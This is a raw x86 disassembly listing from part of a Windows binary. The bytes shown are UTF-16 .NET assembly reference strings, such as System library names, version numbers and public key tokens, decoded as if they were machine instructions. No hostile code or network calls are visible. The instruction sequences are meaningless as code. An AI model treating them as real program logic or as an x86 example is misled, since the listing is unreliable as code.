  40c38a:	jns    0x40c38c
  40c38c:	push   esp
  40c38d:	add    BYTE PTR [edi+0x0],ch
  40c390:	imul   eax,DWORD PTR [eax],0x65
  40c393:	add    BYTE PTR [esi+0x0],ch
  40c396:	cmp    eax,0x31003300
  40c39b:	add    BYTE PTR [edx+0x0],ah
  40c39e:	data16 add BYTE PTR [ebx],dh
  40c3a1:	add    BYTE PTR [eax],bh
  40c3a3:	add    BYTE PTR ds:0x61003600,dh
  40c3a9:	add    BYTE PTR [eax+eax*1+0x33],ah
  40c3ad:	add    BYTE PTR [esi],dh
  40c3af:	add    BYTE PTR [eax+eax*1],dh
  40c3b2:	add    BYTE PTR gs:[ebx],dh
  40c3b5:	add    BYTE PTR ds:0x53b68000,dh
  40c3bb:	add    BYTE PTR [ecx+0x0],bh
  40c3be:	jae    0x40c3c0
  40c3c0:	je     0x40c3c2
  40c3c2:	add    BYTE PTR gs:[ebp+0x0],ch
  40c3c6:	add    BYTE PTR cs:[edi+0x0],dl
  40c3ca:	add    BYTE PTR gs:[edx+0x0],ah
  40c3ce:	add    BYTE PTR cs:[ebp+0x0],al
  40c3d2:	outs   dx,BYTE PTR ds:[esi]
  40c3d3:	add    BYTE PTR [eax+eax*1+0x69],dh
  40c3d7:	add    BYTE PTR [eax+eax*1+0x79],dh
  40c3db:	add    BYTE PTR [esi],ch
  40c3dd:	add    BYTE PTR [eax+eax*1+0x65],al
  40c3e1:	add    BYTE PTR [ebx+0x0],dh
  40c3e4:	imul   eax,DWORD PTR [eax],0x6e0067
  40c3ea:	sub    al,0x0
  40c3ec:	and    BYTE PTR [eax],al
  40c3ee:	push   esi
  40c3ef:	add    BYTE PTR [ebp+0x0],ah
  40c3f2:	jb     0x40c3f4
  40c3f4:	jae    0x40c3f6
  40c3f6:	imul   eax,DWORD PTR [eax],0x6e006f
  40c3fc:	cmp    eax,0x2e003300
  40c401:	add    BYTE PTR ds:0x30002e00,dh
  40c407:	add    BYTE PTR [esi],ch
  40c409:	add    BYTE PTR [eax],dh
  40c40b:	add    BYTE PTR [eax+eax*1],ch
  40c40e:	and    BYTE PTR [eax],al
  40c410:	inc    ebx
  40c411:	add    BYTE PTR [ebp+0x0],dh
  40c414:	ins    BYTE PTR es:[edi],dx
  40c415:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c419:	add    BYTE PTR [edx+0x0],dh
  40c41c:	add    BYTE PTR gs:0x65006e00,bh
  40c423:	add    BYTE PTR [ebp+0x0],dh
  40c426:	je     0x40c428
  40c428:	jb     0x40c42a
  40c42a:	popa   
  40c42b:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40c42f:	add    BYTE PTR [eax],ah
  40c431:	add    BYTE PTR [eax+0x0],dl
  40c434:	jne    0x40c436
  40c436:	bound  eax,QWORD PTR [eax]
  40c438:	ins    BYTE PTR es:[edi],dx
  40c439:	add    BYTE PTR [ecx+0x0],ch
  40c43c:	arpl   WORD PTR [eax],ax
  40c43e:	dec    ebx
  40c43f:	add    BYTE PTR [ebp+0x0],ah
  40c442:	jns    0x40c444
  40c444:	push   esp
  40c445:	add    BYTE PTR [edi+0x0],ch
  40c448:	imul   eax,DWORD PTR [eax],0x65
  40c44b:	add    BYTE PTR [esi+0x0],ch
  40c44e:	cmp    eax,0x37006200
  40c453:	add    BYTE PTR [edi],dh
  40c455:	add    BYTE PTR [ecx+0x0],ah
  40c458:	xor    eax,0x35006300
  40c45d:	add    BYTE PTR [esi],dh
  40c45f:	add    BYTE PTR [ecx],dh
  40c461:	add    BYTE PTR [ecx],bh
  40c463:	add    BYTE PTR [ebx],dh
  40c465:	add    BYTE PTR [eax+eax*1],dh
  40c468:	add    BYTE PTR gs:[eax],dh
  40c46b:	add    BYTE PTR [eax],bh
  40c46d:	add    BYTE PTR [ecx],bh
  40c46f:	add    BYTE PTR [eax+0x790053b0],al
  40c475:	add    BYTE PTR [ebx+0x0],dh
  40c478:	je     0x40c47a
  40c47a:	add    BYTE PTR gs:[ebp+0x0],ch
  40c47e:	add    BYTE PTR cs:[edi+0x0],dl
  40c482:	add    BYTE PTR gs:[edx+0x0],ah
  40c486:	add    BYTE PTR cs:[ebp+0x0],al
  40c48a:	js     0x40c48c
  40c48c:	je     0x40c48e
  40c48e:	add    BYTE PTR gs:[esi+0x0],ch
  40c492:	jae    0x40c494
  40c494:	imul   eax,DWORD PTR [eax],0x6e006f
  40c49a:	jae    0x40c49c
  40c49c:	sub    al,0x0
  40c49e:	and    BYTE PTR [eax],al
  40c4a0:	push   esi
  40c4a1:	add    BYTE PTR [ebp+0x0],ah
  40c4a4:	jb     0x40c4a6
  40c4a6:	jae    0x40c4a8
  40c4a8:	imul   eax,DWORD PTR [eax],0x6e006f
  40c4ae:	cmp    eax,0x2e003300
  40c4b3:	add    BYTE PTR ds:0x30002e00,dh
  40c4b9:	add    BYTE PTR [esi],ch
  40c4bb:	add    BYTE PTR [eax],dh
  40c4bd:	add    BYTE PTR [eax+eax*1],ch
  40c4c0:	and    BYTE PTR [eax],al
  40c4c2:	inc    ebx
  40c4c3:	add    BYTE PTR [ebp+0x0],dh
  40c4c6:	ins    BYTE PTR es:[edi],dx
  40c4c7:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c4cb:	add    BYTE PTR [edx+0x0],dh
  40c4ce:	add    BYTE PTR gs:0x65006e00,bh
  40c4d5:	add    BYTE PTR [ebp+0x0],dh
  40c4d8:	je     0x40c4da
  40c4da:	jb     0x40c4dc
  40c4dc:	popa   
  40c4dd:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40c4e1:	add    BYTE PTR [eax],ah
  40c4e3:	add    BYTE PTR [eax+0x0],dl
  40c4e6:	jne    0x40c4e8
  40c4e8:	bound  eax,QWORD PTR [eax]
  40c4ea:	ins    BYTE PTR es:[edi],dx
  40c4eb:	add    BYTE PTR [ecx+0x0],ch
  40c4ee:	arpl   WORD PTR [eax],ax
  40c4f0:	dec    ebx
  40c4f1:	add    BYTE PTR [ebp+0x0],ah
  40c4f4:	jns    0x40c4f6
  40c4f6:	push   esp
  40c4f7:	add    BYTE PTR [edi+0x0],ch
  40c4fa:	imul   eax,DWORD PTR [eax],0x65
  40c4fd:	add    BYTE PTR [esi+0x0],ch
  40c500:	cmp    eax,0x31003300
  40c505:	add    BYTE PTR [edx+0x0],ah
  40c508:	data16 add BYTE PTR [ebx],dh
  40c50b:	add    BYTE PTR [eax],bh
  40c50d:	add    BYTE PTR ds:0x61003600,dh
  40c513:	add    BYTE PTR [eax+eax*1+0x33],ah
  40c517:	add    BYTE PTR [esi],dh
  40c519:	add    BYTE PTR [eax+eax*1],dh
  40c51c:	add    BYTE PTR gs:[ebx],dh
  40c51f:	add    BYTE PTR ds:0x53be8000,dh
  40c525:	add    BYTE PTR [ecx+0x0],bh
  40c528:	jae    0x40c52a
  40c52a:	je     0x40c52c
  40c52c:	add    BYTE PTR gs:[ebp+0x0],ch
  40c530:	add    BYTE PTR cs:[edi+0x0],dl
  40c534:	add    BYTE PTR gs:[edx+0x0],ah
  40c538:	add    BYTE PTR cs:[ebp+0x0],al
  40c53c:	js     0x40c53e
  40c53e:	je     0x40c540
  40c540:	add    BYTE PTR gs:[esi+0x0],ch
  40c544:	jae    0x40c546
  40c546:	imul   eax,DWORD PTR [eax],0x6e006f
  40c54c:	jae    0x40c54e
  40c54e:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  40c553:	add    BYTE PTR [ebx+0x0],dh
  40c556:	imul   eax,DWORD PTR [eax],0x6e0067
  40c55c:	sub    al,0x0
  40c55e:	and    BYTE PTR [eax],al
  40c560:	push   esi
  40c561:	add    BYTE PTR [ebp+0x0],ah
  40c564:	jb     0x40c566
  40c566:	jae    0x40c568
  40c568:	imul   eax,DWORD PTR [eax],0x6e006f
  40c56e:	cmp    eax,0x2e003300
  40c573:	add    BYTE PTR ds:0x30002e00,dh
  40c579:	add    BYTE PTR [esi],ch
  40c57b:	add    BYTE PTR [eax],dh
  40c57d:	add    BYTE PTR [eax+eax*1],ch
  40c580:	and    BYTE PTR [eax],al
  40c582:	inc    ebx
  40c583:	add    BYTE PTR [ebp+0x0],dh
  40c586:	ins    BYTE PTR es:[edi],dx
  40c587:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c58b:	add    BYTE PTR [edx+0x0],dh
  40c58e:	add    BYTE PTR gs:0x65006e00,bh
  40c595:	add    BYTE PTR [ebp+0x0],dh
  40c598:	je     0x40c59a
  40c59a:	jb     0x40c59c
  40c59c:	popa   
  40c59d:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40c5a1:	add    BYTE PTR [eax],ah
  40c5a3:	add    BYTE PTR [eax+0x0],dl
  40c5a6:	jne    0x40c5a8
  40c5a8:	bound  eax,QWORD PTR [eax]
  40c5aa:	ins    BYTE PTR es:[edi],dx
  40c5ab:	add    BYTE PTR [ecx+0x0],ch
  40c5ae:	arpl   WORD PTR [eax],ax
  40c5b0:	dec    ebx
  40c5b1:	add    BYTE PTR [ebp+0x0],ah
  40c5b4:	jns    0x40c5b6
  40c5b6:	push   esp
  40c5b7:	add    BYTE PTR [edi+0x0],ch
  40c5ba:	imul   eax,DWORD PTR [eax],0x65
  40c5bd:	add    BYTE PTR [esi+0x0],ch
  40c5c0:	cmp    eax,0x31003300
  40c5c5:	add    BYTE PTR [edx+0x0],ah
  40c5c8:	data16 add BYTE PTR [ebx],dh
  40c5cb:	add    BYTE PTR [eax],bh
  40c5cd:	add    BYTE PTR ds:0x61003600,dh
  40c5d3:	add    BYTE PTR [eax+eax*1+0x33],ah
  40c5d7:	add    BYTE PTR [esi],dh
  40c5d9:	add    BYTE PTR [eax+eax*1],dh
  40c5dc:	add    BYTE PTR gs:[ebx],dh
  40c5df:	add    BYTE PTR ds:0x53a88000,dh
  40c5e5:	add    BYTE PTR [ecx+0x0],bh
  40c5e8:	jae    0x40c5ea
  40c5ea:	je     0x40c5ec
  40c5ec:	add    BYTE PTR gs:[ebp+0x0],ch
  40c5f0:	add    BYTE PTR cs:[edi+0x0],dl
  40c5f4:	add    BYTE PTR gs:[edx+0x0],ah
  40c5f8:	add    BYTE PTR cs:[ebp+0x0],cl
  40c5fc:	outs   dx,DWORD PTR ds:[esi]
  40c5fd:	add    BYTE PTR [edx+0x0],ah
  40c600:	imul   eax,DWORD PTR [eax],0x65006c
  40c606:	sub    al,0x0
  40c608:	and    BYTE PTR [eax],al
  40c60a:	push   esi
  40c60b:	add    BYTE PTR [ebp+0x0],ah
  40c60e:	jb     0x40c610
  40c610:	jae    0x40c612
  40c612:	imul   eax,DWORD PTR [eax],0x6e006f
  40c618:	cmp    eax,0x2e003200
  40c61d:	add    BYTE PTR [eax],dh
  40c61f:	add    BYTE PTR [esi],ch
  40c621:	add    BYTE PTR [eax],dh
  40c623:	add    BYTE PTR [esi],ch
  40c625:	add    BYTE PTR [eax],dh
  40c627:	add    BYTE PTR [eax+eax*1],ch
  40c62a:	and    BYTE PTR [eax],al
  40c62c:	inc    ebx
  40c62d:	add    BYTE PTR [ebp+0x0],dh
  40c630:	ins    BYTE PTR es:[edi],dx
  40c631:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c635:	add    BYTE PTR [edx+0x0],dh
  40c638:	add    BYTE PTR gs:0x65006e00,bh
  40c63f:	add    BYTE PTR [ebp+0x0],dh
  40c642:	je     0x40c644
  40c644:	jb     0x40c646
  40c646:	popa   
  40c647:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40c64b:	add    BYTE PTR [eax],ah
  40c64d:	add    BYTE PTR [eax+0x0],dl
  40c650:	jne    0x40c652
  40c652:	bound  eax,QWORD PTR [eax]
  40c654:	ins    BYTE PTR es:[edi],dx
  40c655:	add    BYTE PTR [ecx+0x0],ch
  40c658:	arpl   WORD PTR [eax],ax
  40c65a:	dec    ebx
  40c65b:	add    BYTE PTR [ebp+0x0],ah
  40c65e:	jns    0x40c660
  40c660:	push   esp
  40c661:	add    BYTE PTR [edi+0x0],ch
  40c664:	imul   eax,DWORD PTR [eax],0x65
  40c667:	add    BYTE PTR [esi+0x0],ch
  40c66a:	cmp    eax,0x30006200
  40c66f:	add    BYTE PTR [ebx],dh
  40c671:	add    BYTE PTR [esi+0x0],ah
  40c674:	xor    eax,0x37006600
  40c679:	add    BYTE PTR [esi+0x0],ah
  40c67c:	xor    DWORD PTR [eax],eax
  40c67e:	xor    DWORD PTR [eax],eax
  40c680:	add    BYTE PTR fs:0x61003000,dh
  40c687:	add    BYTE PTR [ebx],dh
  40c689:	add    BYTE PTR [ecx+0x0],ah
  40c68c:	add    al,0x53
  40c68f:	add    BYTE PTR [ecx+0x0],bh
  40c692:	jae    0x40c694
  40c694:	je     0x40c696
  40c696:	add    BYTE PTR gs:[ebp+0x0],ch
  40c69a:	add    BYTE PTR cs:[edi+0x0],dl
  40c69e:	add    BYTE PTR gs:[edx+0x0],ah
  40c6a2:	add    BYTE PTR cs:[edx+0x0],dl
  40c6a6:	add    BYTE PTR gs:[edi+0x0],ah
  40c6aa:	jne    0x40c6ac
  40c6ac:	ins    BYTE PTR es:[edi],dx
  40c6ad:	add    BYTE PTR [ecx+0x0],ah
  40c6b0:	jb     0x40c6b2
  40c6b2:	inc    ebp
  40c6b3:	add    BYTE PTR [eax+0x0],bh
  40c6b6:	jo     0x40c6b8
  40c6b8:	jb     0x40c6ba
  40c6ba:	add    BYTE PTR gs:[ebx+0x0],dh
  40c6be:	jae    0x40c6c0
  40c6c0:	imul   eax,DWORD PTR [eax],0x6e006f
  40c6c6:	jae    0x40c6c8
  40c6c8:	sub    al,0x0
  40c6ca:	and    BYTE PTR [eax],al
  40c6cc:	push   esi
  40c6cd:	add    BYTE PTR [ebp+0x0],ah
  40c6d0:	jb     0x40c6d2
  40c6d2:	jae    0x40c6d4
  40c6d4:	imul   eax,DWORD PTR [eax],0x6e006f
  40c6da:	cmp    eax,0x2e003200
  40c6df:	add    BYTE PTR [eax],dh
  40c6e1:	add    BYTE PTR [esi],ch
  40c6e3:	add    BYTE PTR [eax],dh
  40c6e5:	add    BYTE PTR [esi],ch
  40c6e7:	add    BYTE PTR [eax],dh
  40c6e9:	add    BYTE PTR [eax+eax*1],ch
  40c6ec:	and    BYTE PTR [eax],al
  40c6ee:	inc    ebx
  40c6ef:	add    BYTE PTR [ebp+0x0],dh
  40c6f2:	ins    BYTE PTR es:[edi],dx
  40c6f3:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c6f7:	add    BYTE PTR [edx+0x0],dh
  40c6fa:	add    BYTE PTR gs:0x65006e00,bh
  40c701:	add    BYTE PTR [ebp+0x0],dh
  40c704:	je     0x40c706
  40c706:	jb     0x40c708
  40c708:	popa   
  40c709:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40c70d:	add    BYTE PTR [eax],ah
  40c70f:	add    BYTE PTR [eax+0x0],dl
  40c712:	jne    0x40c714
  40c714:	bound  eax,QWORD PTR [eax]
  40c716:	ins    BYTE PTR es:[edi],dx
  40c717:	add    BYTE PTR [ecx+0x0],ch
  40c71a:	arpl   WORD PTR [eax],ax
  40c71c:	dec    ebx
  40c71d:	add    BYTE PTR [ebp+0x0],ah
  40c720:	jns    0x40c722
  40c722:	push   esp
  40c723:	add    BYTE PTR [edi+0x0],ch
  40c726:	imul   eax,DWORD PTR [eax],0x65
  40c729:	add    BYTE PTR [esi+0x0],ch
  40c72c:	cmp    eax,0x30006200
  40c731:	add    BYTE PTR [ebx],dh
  40c733:	add    BYTE PTR [esi+0x0],ah
  40c736:	xor    eax,0x37006600
  40c73b:	add    BYTE PTR [esi+0x0],ah
  40c73e:	xor    DWORD PTR [eax],eax
  40c740:	xor    DWORD PTR [eax],eax
  40c742:	add    BYTE PTR fs:0x61003000,dh
  40c749:	add    BYTE PTR [ebx],dh
  40c74b:	add    BYTE PTR [ecx+0x0],ah
  40c74e:	sub    BYTE PTR [edx+0x790053],0x73
  40c755:	add    BYTE PTR [eax+eax*1+0x65],dh
  40c759:	add    BYTE PTR [ebp+0x0],ch
  40c75c:	add    BYTE PTR cs:[edi+0x0],dl
  40c760:	add    BYTE PTR gs:[edx+0x0],ah
  40c764:	add    BYTE PTR cs:[edx+0x0],dl
  40c768:	outs   dx,DWORD PTR ds:[esi]
  40c769:	add    BYTE PTR [ebp+0x0],dh
  40c76c:	je     0x40c76e
  40c76e:	imul   eax,DWORD PTR [eax],0x67006e
  40c774:	sub    al,0x0
  40c776:	and    BYTE PTR [eax],al
  40c778:	push   esi
  40c779:	add    BYTE PTR [ebp+0x0],ah
  40c77c:	jb     0x40c77e
  40c77e:	jae    0x40c780
  40c780:	imul   eax,DWORD PTR [eax],0x6e006f
  40c786:	cmp    eax,0x2e003300
  40c78b:	add    BYTE PTR ds:0x30002e00,dh
  40c791:	add    BYTE PTR [esi],ch
  40c793:	add    BYTE PTR [eax],dh
  40c795:	add    BYTE PTR [eax+eax*1],ch
  40c798:	and    BYTE PTR [eax],al
  40c79a:	inc    ebx
  40c79b:	add    BYTE PTR [ebp+0x0],dh
  40c79e:	ins    BYTE PTR es:[edi],dx
  40c79f:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c7a3:	add    BYTE PTR [edx+0x0],dh
  40c7a6:	add    BYTE PTR gs:0x65006e00,bh
  40c7ad:	add    BYTE PTR [ebp+0x0],dh
  40c7b0:	je     0x40c7b2
  40c7b2:	jb     0x40c7b4
  40c7b4:	popa   
  40c7b5:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40c7b9:	add    BYTE PTR [eax],ah
  40c7bb:	add    BYTE PTR [eax+0x0],dl
  40c7be:	jne    0x40c7c0
  40c7c0:	bound  eax,QWORD PTR [eax]
  40c7c2:	ins    BYTE PTR es:[edi],dx
  40c7c3:	add    BYTE PTR [ecx+0x0],ch
  40c7c6:	arpl   WORD PTR [eax],ax
  40c7c8:	dec    ebx
  40c7c9:	add    BYTE PTR [ebp+0x0],ah
  40c7cc:	jns    0x40c7ce
  40c7ce:	push   esp
  40c7cf:	add    BYTE PTR [edi+0x0],ch
  40c7d2:	imul   eax,DWORD PTR [eax],0x65
  40c7d5:	add    BYTE PTR [esi+0x0],ch
  40c7d8:	cmp    eax,0x31003300
  40c7dd:	add    BYTE PTR [edx+0x0],ah
  40c7e0:	data16 add BYTE PTR [ebx],dh
  40c7e3:	add    BYTE PTR [eax],bh
  40c7e5:	add    BYTE PTR ds:0x61003600,dh
  40c7eb:	add    BYTE PTR [eax+eax*1+0x33],ah
  40c7ef:	add    BYTE PTR [esi],dh
  40c7f1:	add    BYTE PTR [eax+eax*1],dh
  40c7f4:	add    BYTE PTR gs:[ebx],dh
  40c7f7:	add    BYTE PTR ds:0x53ac8000,dh
  40c7fd:	add    BYTE PTR [ecx+0x0],bh
  40c800:	jae    0x40c802
  40c802:	je     0x40c804
  40c804:	add    BYTE PTR gs:[ebp+0x0],ch
  40c808:	add    BYTE PTR cs:[edi+0x0],dl
  40c80c:	add    BYTE PTR gs:[edx+0x0],ah
  40c810:	add    BYTE PTR cs:[ebx+0x0],dl
  40c814:	add    BYTE PTR gs:[edx+0x0],dh
  40c818:	jbe    0x40c81a
  40c81a:	imul   eax,DWORD PTR [eax],0x650063
  40c820:	jae    0x40c822
  40c822:	sub    al,0x0
  40c824:	and    BYTE PTR [eax],al
  40c826:	push   esi
  40c827:	add    BYTE PTR [ebp+0x0],ah
  40c82a:	jb     0x40c82c
  40c82c:	jae    0x40c82e
  40c82e:	imul   eax,DWORD PTR [eax],0x6e006f
  40c834:	cmp    eax,0x2e003200
  40c839:	add    BYTE PTR [eax],dh
  40c83b:	add    BYTE PTR [esi],ch
  40c83d:	add    BYTE PTR [eax],dh
  40c83f:	add    BYTE PTR [esi],ch
  40c841:	add    BYTE PTR [eax],dh
  40c843:	add    BYTE PTR [eax+eax*1],ch
  40c846:	and    BYTE PTR [eax],al
  40c848:	inc    ebx
  40c849:	add    BYTE PTR [ebp+0x0],dh
  40c84c:	ins    BYTE PTR es:[edi],dx
  40c84d:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c851:	add    BYTE PTR [edx+0x0],dh
  40c854:	add    BYTE PTR gs:0x65006e00,bh
  40c85b:	add    BYTE PTR [ebp+0x0],dh
  40c85e:	je     0x40c860
  40c860:	jb     0x40c862
  40c862:	popa   
  40c863:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40c867:	add    BYTE PTR [eax],ah
  40c869:	add    BYTE PTR [eax+0x0],dl
  40c86c:	jne    0x40c86e
  40c86e:	bound  eax,QWORD PTR [eax]
  40c870:	ins    BYTE PTR es:[edi],dx
  40c871:	add    BYTE PTR [ecx+0x0],ch
  40c874:	arpl   WORD PTR [eax],ax
  40c876:	dec    ebx
  40c877:	add    BYTE PTR [ebp+0x0],ah
  40c87a:	jns    0x40c87c
  40c87c:	push   esp
  40c87d:	add    BYTE PTR [edi+0x0],ch
  40c880:	imul   eax,DWORD PTR [eax],0x65
  40c883:	add    BYTE PTR [esi+0x0],ch
  40c886:	cmp    eax,0x30006200
  40c88b:	add    BYTE PTR [ebx],dh
  40c88d:	add    BYTE PTR [esi+0x0],ah
  40c890:	xor    eax,0x37006600
  40c895:	add    BYTE PTR [esi+0x0],ah
  40c898:	xor    DWORD PTR [eax],eax
  40c89a:	xor    DWORD PTR [eax],eax
  40c89c:	add    BYTE PTR fs:0x61003000,dh
  40c8a3:	add    BYTE PTR [ebx],dh
  40c8a5:	add    BYTE PTR [ecx+0x0],ah
  40c8a8:	xor    BYTE PTR [edx+0x69004d],0x63
  40c8af:	add    BYTE PTR [edx+0x0],dh
  40c8b2:	outs   dx,DWORD PTR ds:[esi]
  40c8b3:	add    BYTE PTR [ebx+0x0],dh
  40c8b6:	outs   dx,DWORD PTR ds:[esi]
  40c8b7:	add    BYTE PTR [esi+0x0],ah
  40c8ba:	je     0x40c8bc
  40c8bc:	add    BYTE PTR cs:[esi+0x0],dl
  40c8c0:	imul   eax,DWORD PTR [eax],0x750073
  40c8c6:	popa   
  40c8c7:	add    BYTE PTR [eax+eax*1+0x53],ch
  40c8cb:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c8cf:	add    BYTE PTR [eax+eax*1+0x69],ah
  40c8d3:	add    BYTE PTR [edi+0x0],ch
  40c8d6:	sub    al,0x0
  40c8d8:	and    BYTE PTR [eax],al
  40c8da:	push   esi
  40c8db:	add    BYTE PTR [ebp+0x0],ah
  40c8de:	jb     0x40c8e0
  40c8e0:	jae    0x40c8e2
  40c8e2:	imul   eax,DWORD PTR [eax],0x6e006f
  40c8e8:	cmp    eax,0x2e003200
  40c8ed:	add    BYTE PTR [eax],dh
  40c8ef:	add    BYTE PTR [esi],ch
  40c8f1:	add    BYTE PTR [eax],dh
  40c8f3:	add    BYTE PTR [esi],ch
  40c8f5:	add    BYTE PTR [eax],dh
  40c8f7:	add    BYTE PTR [eax+eax*1],ch
  40c8fa:	and    BYTE PTR [eax],al
  40c8fc:	inc    ebx
  40c8fd:	add    BYTE PTR [ebp+0x0],dh
  40c900:	ins    BYTE PTR es:[edi],dx
  40c901:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c905:	add    BYTE PTR [edx+0x0],dh
  40c908:	add    BYTE PTR gs:0x65006e00,bh
  40c90f:	add    BYTE PTR [ebp+0x0],dh
  40c912:	je     0x40c914
  40c914:	jb     0x40c916
  40c916:	popa   
  40c917:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40c91b:	add    BYTE PTR [eax],ah
  40c91d:	add    BYTE PTR [eax+0x0],dl
  40c920:	jne    0x40c922
  40c922:	bound  eax,QWORD PTR [eax]
  40c924:	ins    BYTE PTR es:[edi],dx
  40c925:	add    BYTE PTR [ecx+0x0],ch
  40c928:	arpl   WORD PTR [eax],ax
  40c92a:	dec    ebx
  40c92b:	add    BYTE PTR [ebp+0x0],ah
  40c92e:	jns    0x40c930
  40c930:	push   esp
  40c931:	add    BYTE PTR [edi+0x0],ch
  40c934:	imul   eax,DWORD PTR [eax],0x65
  40c937:	add    BYTE PTR [esi+0x0],ch
  40c93a:	cmp    eax,0x30006200
  40c93f:	add    BYTE PTR [ebx],dh
  40c941:	add    BYTE PTR [esi+0x0],ah
  40c944:	xor    eax,0x37006600
  40c949:	add    BYTE PTR [esi+0x0],ah
  40c94c:	xor    DWORD PTR [eax],eax
  40c94e:	xor    DWORD PTR [eax],eax
  40c950:	add    BYTE PTR fs:0x61003000,dh
  40c957:	add    BYTE PTR [ebx],dh
  40c959:	add    BYTE PTR [ecx+0x0],ah
  40c95c:	or     dh,0x4d
  40c95f:	add    BYTE PTR [ecx+0x0],ch
  40c962:	arpl   WORD PTR [eax],ax
  40c964:	jb     0x40c966
  40c966:	outs   dx,DWORD PTR ds:[esi]
  40c967:	add    BYTE PTR [ebx+0x0],dh
  40c96a:	outs   dx,DWORD PTR ds:[esi]
  40c96b:	add    BYTE PTR [esi+0x0],ah
  40c96e:	je     0x40c970
  40c970:	add    BYTE PTR cs:[esi+0x0],dl
  40c974:	imul   eax,DWORD PTR [eax],0x750073
  40c97a:	popa   
  40c97b:	add    BYTE PTR [eax+eax*1+0x53],ch
  40c97f:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c983:	add    BYTE PTR [eax+eax*1+0x69],ah
  40c987:	add    BYTE PTR [edi+0x0],ch
  40c98a:	add    BYTE PTR cs:[edi+0x0],dl
  40c98e:	imul   eax,DWORD PTR [eax],0x64006e
  40c994:	outs   dx,DWORD PTR ds:[esi]
  40c995:	add    BYTE PTR [edi+0x0],dh
  40c998:	jae    0x40c99a
  40c99a:	add    BYTE PTR cs:[esi+0x0],al
  40c99e:	outs   dx,DWORD PTR ds:[esi]
  40c99f:	add    BYTE PTR [edx+0x0],dh
  40c9a2:	ins    DWORD PTR es:[edi],dx
  40c9a3:	add    BYTE PTR [ebx+0x0],dh
  40c9a6:	sub    al,0x0
  40c9a8:	and    BYTE PTR [eax],al
  40c9aa:	push   esi
  40c9ab:	add    BYTE PTR [ebp+0x0],ah
  40c9ae:	jb     0x40c9b0
  40c9b0:	jae    0x40c9b2
  40c9b2:	imul   eax,DWORD PTR [eax],0x6e006f
  40c9b8:	cmp    eax,0x2e003200
  40c9bd:	add    BYTE PTR [eax],dh
  40c9bf:	add    BYTE PTR [esi],ch
  40c9c1:	add    BYTE PTR [eax],dh
  40c9c3:	add    BYTE PTR [esi],ch
  40c9c5:	add    BYTE PTR [eax],dh
  40c9c7:	add    BYTE PTR [eax+eax*1],ch
  40c9ca:	and    BYTE PTR [eax],al
  40c9cc:	inc    ebx
  40c9cd:	add    BYTE PTR [ebp+0x0],dh
  40c9d0:	ins    BYTE PTR es:[edi],dx
  40c9d1:	add    BYTE PTR [eax+eax*1+0x75],dh
  40c9d5:	add    BYTE PTR [edx+0x0],dh
  40c9d8:	add    BYTE PTR gs:0x65006e00,bh
  40c9df:	add    BYTE PTR [ebp+0x0],dh
  40c9e2:	je     0x40c9e4
  40c9e4:	jb     0x40c9e6
  40c9e6:	popa   
  40c9e7:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40c9eb:	add    BYTE PTR [eax],ah
  40c9ed:	add    BYTE PTR [eax+0x0],dl
  40c9f0:	jne    0x40c9f2
  40c9f2:	bound  eax,QWORD PTR [eax]
  40c9f4:	ins    BYTE PTR es:[edi],dx
  40c9f5:	add    BYTE PTR [ecx+0x0],ch
  40c9f8:	arpl   WORD PTR [eax],ax
  40c9fa:	dec    ebx
  40c9fb:	add    BYTE PTR [ebp+0x0],ah
  40c9fe:	jns    0x40ca00
  40ca00:	push   esp
  40ca01:	add    BYTE PTR [edi+0x0],ch
  40ca04:	imul   eax,DWORD PTR [eax],0x65
  40ca07:	add    BYTE PTR [esi+0x0],ch
  40ca0a:	cmp    eax,0x30006200
  40ca0f:	add    BYTE PTR [ebx],dh
  40ca11:	add    BYTE PTR [esi+0x0],ah
  40ca14:	xor    eax,0x37006600
  40ca19:	add    BYTE PTR [esi+0x0],ah
  40ca1c:	xor    DWORD PTR [eax],eax
  40ca1e:	xor    DWORD PTR [eax],eax
  40ca20:	add    BYTE PTR fs:0x61003000,dh
  40ca27:	add    BYTE PTR [ebx],dh
  40ca29:	add    BYTE PTR [ecx+0x0],ah
  40ca2c:	sub    BYTE PTR [esi+edx*2+0x53004a00],0x0
  40ca34:	push   0x72006100
  40ca39:	add    BYTE PTR [eax+0x0],dh
  40ca3c:	inc    ebx
  40ca3d:	add    BYTE PTR [edi+0x0],ch
  40ca40:	add    BYTE PTR fs:[ebp+0x0],ah
  40ca44:	push   eax
  40ca45:	add    BYTE PTR [edx+0x0],dh
  40ca48:	outs   dx,DWORD PTR ds:[esi]
  40ca49:	add    BYTE PTR [esi+0x0],dh
  40ca4c:	imul   eax,DWORD PTR [eax],0x650064
  40ca52:	jb     0x40ca54
  40ca54:	sub    al,0x0
  40ca56:	and    BYTE PTR [eax],al
  40ca58:	push   esi
  40ca59:	add    BYTE PTR [ebp+0x0],ah
  40ca5c:	jb     0x40ca5e
  40ca5e:	jae    0x40ca60
  40ca60:	imul   eax,DWORD PTR [eax],0x6e006f
  40ca66:	cmp    eax,0x2e003200
  40ca6b:	add    BYTE PTR [eax],dh
  40ca6d:	add    BYTE PTR [esi],ch
  40ca6f:	add    BYTE PTR [eax],dh
  40ca71:	add    BYTE PTR [esi],ch
  40ca73:	add    BYTE PTR [eax],dh
  40ca75:	add    BYTE PTR [eax+eax*1],ch
  40ca78:	and    BYTE PTR [eax],al
  40ca7a:	inc    ebx
  40ca7b:	add    BYTE PTR [ebp+0x0],dh
  40ca7e:	ins    BYTE PTR es:[edi],dx
  40ca7f:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ca83:	add    BYTE PTR [edx+0x0],dh
